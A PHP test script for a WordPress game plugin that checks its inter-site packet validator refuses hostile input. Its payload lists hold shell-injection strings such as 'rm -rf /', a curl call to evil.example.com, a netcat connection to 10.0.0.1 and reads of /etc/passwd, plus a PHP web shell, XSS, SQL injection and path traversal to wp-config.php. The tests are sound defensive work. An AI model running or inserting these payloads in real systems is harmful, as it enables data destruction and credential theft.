<?php
/**
 * What a packet is allowed to contain, tested by trying to smuggle things past it.
 *
 * Written the way an attacker would approach it rather than the way the feature
 * was written: shell metacharacters, SQL, null bytes, path traversal, script
 * tags, type confusion, numbers that overflow, dates that strtotime would
 * happily accept, fields nobody declared, and packets addressed to somebody
 * else. Every one of them should be refused by name.
 *
 * Two things are being demonstrated. The narrow one is that input with no
 * legitimate shape does not get stored. The broader one is that it would have
 * been inert anyway: nothing from a packet is executed, and there is no shell,
 * eval or unserialize anywhere in the plugin for it to reach.
 */
define('ABSPATH', __DIR__ . '/');

function wp_json_encode($data) { return json_encode($data); }
class IDO_Game_Exception extends Exception {}
class IDO_Game { const MAX_VALUE = 9000000000000000; }

require __DIR__ . '/../includes/league/class-ido-league-crypto.php';
require __DIR__ . '/../includes/league/class-ido-league-packet.php';

$fails = 0;
function check(string $label, bool $ok, string $detail = ''): void {
    global $fails;
    if (!$ok) $fails++;
    printf("%-64s %s%s\n", $label, $ok ? 'PASS' : 'FAIL', $detail ? '  (' . $detail . ')' : '');
}

$us    = '11111111-1111-4111-8111-111111111111';
$them  = '22222222-2222-4222-8222-222222222222';
$league = '33333333-3333-4333-8333-333333333333';

function good_packet(array $override = [], array $body_override = []): array {
    global $us, $them, $league;
    $body = array_merge([
        'site_name'        => 'Northmarch',
        'round_id'         => 1,
        'round_day'        => 12,
        'empire_count'     => 14,
        'networth'         => 4500000,
        'largest_networth' => 900000,
        'accepting'        => true,
        'as_of'            => '2026-09-27 11:30:00',
    ], $body_override);
    foreach ($body as $k => $v) { if ($v === null) unset($body[$k]); }

    $packet = array_merge([
        'v' => 1, 'type' => 'news', 'league' => $league, 'from' => $them, 'to' => $us,
        'uuid' => '44444444-4444-4444-8444-444444444444', 'seq' => 9, 'ts' => time(),
        'fp' => str_repeat('a', 64), 'body' => $body,
    ], $override);
    foreach ($packet as $k => $v) { if ($v === null) unset($packet[$k]); }
    return $packet;
}

/** Tries to read a packet; returns the refusal reason, or '' when accepted. */
function refusal(array $packet): string {
    global $us, $them;
    try {
        IDO_League_Packet::read($packet, $them, $us);
        return '';
    } catch (IDO_Game_Exception $e) {
        return $e->getMessage();
    }
}

echo "=== a legitimate packet still works ===\n";
$read = null;
try { $read = IDO_League_Packet::read(good_packet(), $them, $us); } catch (IDO_Game_Exception $e) { }
check('a well-formed news packet is accepted', is_array($read));
check('and its values come through', is_array($read) && $read['body']['empire_count'] === 14);
check('an optional field may be absent', is_array($read) && !array_key_exists('grace_until', $read['body']));
$with_grace = null;
try {
    $with_grace = IDO_League_Packet::read(good_packet([], ['grace_until' => '2026-10-01 00:00:00']), $them, $us);
} catch (IDO_Game_Exception $e) { }
check('and present when sent', is_array($with_grace) && isset($with_grace['body']['grace_until']));

echo "\n=== command injection attempts in a text field ===\n";
foreach ([
    '; rm -rf /',
    '$(whoami)',
    '`id`',
    'Northmarch && curl http://evil.example.com',
    'Northmarch | nc 10.0.0.1 4444',
    "Northmarch\nrm -rf /",
    'Northmarch; DROP TABLE wp_users',
    '${IFS}cat${IFS}/etc/passwd',
    '<?php system($_GET[0]); ?>',
    '<script>fetch("//evil")</script>',
    "Northmarch\x00.php",
    '../../../../etc/passwd',
    '..\\..\\wp-config.php',
    "O:8:\"stdClass\":0:{}",
    '{{constructor.constructor("alert(1)")()}}',
    "Northmarch\r\nX-Injected: yes",
] as $payload) {
    $why = refusal(good_packet([], ['site_name' => $payload]));
    $label = str_replace(["\n", "\r", "\x00"], ['\n', '\r', '\0'], substr($payload, 0, 34));
    check('refuses  ' . $label, $why !== '', $why === '' ? 'ACCEPTED' : '');
}

echo "\n=== SQL in a text field ===\n";
foreach (["' OR 1=1--", "Northmarch'; DELETE FROM wp_options WHERE 1=1; --", '" UNION SELECT user_pass FROM wp_users'] as $payload) {
    check('refuses  ' . substr($payload, 0, 34), refusal(good_packet([], ['site_name' => $payload])) !== '');
}

echo "\n=== type confusion ===\n";
check('an array where a number belongs',      refusal(good_packet([], ['empire_count' => [1, 2]])) !== '');
check('a numeric string where a number belongs', refusal(good_packet([], ['empire_count' => '14'])) !== '');
check('a float where a whole number belongs', refusal(good_packet([], ['empire_count' => 14.5])) !== '');
check('true where a number belongs',          refusal(good_packet([], ['empire_count' => true])) !== '');
check('a number where a boolean belongs',     refusal(good_packet([], ['accepting' => 1])) !== '');
check('an array where text belongs',          refusal(good_packet([], ['site_name' => ['a']])) !== '');
check('an array where the body belongs',      refusal(good_packet(['body' => 'not a structure'])) !== '');
check('null where a value belongs',           refusal(good_packet([], ['networth' => null])) !== '');

echo "\n=== numbers out of range ===\n";
check('a negative count',            refusal(good_packet([], ['empire_count' => -1])) !== '');
check('a net worth past the ceiling', refusal(good_packet([], ['networth' => PHP_INT_MAX])) !== '');
check('a sequence of zero',          refusal(good_packet(['seq' => 0])) !== '');
check('the wrong envelope version',  refusal(good_packet(['v' => 2])) !== '');

echo "\n=== dates ===\n";
foreach (['now', '+1 year', 'tomorrow', '2026-13-45 99:99:99', '2026-02-30 12:00:00',
          '2026-09-27T11:30:00Z', '2026-09-27 11:30:00 UTC', ''] as $date) {
    check('refuses date  ' . ($date === '' ? '(empty)' : $date),
        refusal(good_packet([], ['as_of' => $date])) !== '');
}
// 2028, because 2026 is not a leap year: the first version of this check
// asserted 2026-02-29 and failed, and checkdate() was right.
check('accepts a real date', refusal(good_packet([], ['as_of' => '2028-02-29 23:59:59'])) === '',
    refusal(good_packet([], ['as_of' => '2028-02-29 23:59:59'])));

echo "\n=== fields nobody declared ===\n";
check('an extra envelope field is an error',
    refusal(good_packet(['land_taken' => 400])) !== '');
check('an extra body field is an error',
    refusal(good_packet([], ['admin' => true])) !== '');
check('a missing envelope field is an error',
    refusal(good_packet(['fp' => null])) !== '');
check('a missing body field is an error',
    refusal(good_packet([], ['networth' => null])) !== '');
check('the error names the field without echoing it raw',
    strpos(refusal(good_packet(['<script>' => 1])), '<script>') === false,
    refusal(good_packet(['<script>' => 1])));

echo "\n=== identity and addressing ===\n";
check('a packet claiming a different sender than it signed as',
    refusal(good_packet(['from' => '55555555-5555-4555-8555-555555555555'])) !== '');
check('a packet addressed to another site',
    refusal(good_packet(['to' => '55555555-5555-4555-8555-555555555555'])) !== '');
check('a packet from itself', refusal(good_packet(['from' => $us, 'to' => $us])) !== '');
check('a malformed identifier', refusal(good_packet(['league' => 'not-a-uuid'])) !== '');
check('an identifier with upper-case hex', refusal(good_packet(['uuid' => '44444444-AAAA-4BBB-8CCC-444444444444'])) !== '');

echo "\n=== a type this build cannot validate ===\n";
foreach (['war', 'result', 'enrol', 'ruleset', 'admin', ''] as $type) {
    check('refuses type  ' . ($type === '' ? '(empty)' : $type), refusal(good_packet(['type' => $type])) !== '');
}

echo "\n=== time ===\n";
check('a packet dated far in the future', refusal(good_packet(['ts' => time() + 86400 * 3])) !== '');
check('a packet dated months ago',        refusal(good_packet(['ts' => time() - 86400 * 60])) !== '');
check('a packet a fortnight old is fine, since the delay is days',
    refusal(good_packet(['ts' => time() - 86400 * 14])) === '');

echo "\n=== the parser is unreachable without the secret ===\n";
$secret = IDO_League_Crypto::secret();
$wrong  = IDO_League_Crypto::secret();
$wire   = IDO_League_Crypto::pack(good_packet(), $them, $secret);
check('open() returns the body with the right secret', is_array(IDO_League_Crypto::open($wire, $secret)));
check('and null with the wrong one', IDO_League_Crypto::open($wire, $wrong) === null);
check('decode() is not callable from outside', !in_array('decode',
    array_map(static fn($m) => $m->name, (new ReflectionClass('IDO_League_Crypto'))->getMethods(ReflectionMethod::IS_PUBLIC)), true));

// Hostile payloads that are correctly signed: the signature only proves origin,
// so a compromised or hostile peer gets this far and the schema is what stops it.
$hostile = IDO_League_Crypto::pack(good_packet([], ['site_name' => '$(curl evil.example.com)']), $them, $secret);
$opened  = IDO_League_Crypto::open($hostile, $secret);
check('a correctly signed hostile packet still opens', is_array($opened));
check('and is then refused by the schema', $opened !== null && refusal($opened) !== '');

echo "\n=== malformed bytes never reach the parser ===\n";
foreach ([
    'ido1.' . $them . '.' . IDO_League_Crypto::b64_encode('{"broken":') . '.' . str_repeat('a', 64),
    'ido1.' . $them . '.' . IDO_League_Crypto::b64_encode(str_repeat('[', 40)) . '.' . str_repeat('a', 64),
    'ido1.' . $them . '.' . IDO_League_Crypto::b64_encode('"a string"') . '.' . str_repeat('a', 64),
    str_repeat('A', IDO_League_Crypto::MAX_BYTES + 10),
    '',
    'ido1..' . IDO_League_Crypto::b64_encode('{}') . '.' . str_repeat('a', 64),
] as $i => $bad) {
    check("unsigned rubbish #$i yields nothing", IDO_League_Crypto::open($bad, $secret) === null);
}

echo "\n" . ($fails === 0 ? "ALL CHECKS PASSED\n" : "$fails CHECK(S) FAILED\n");
exit($fails === 0 ? 0 : 1);
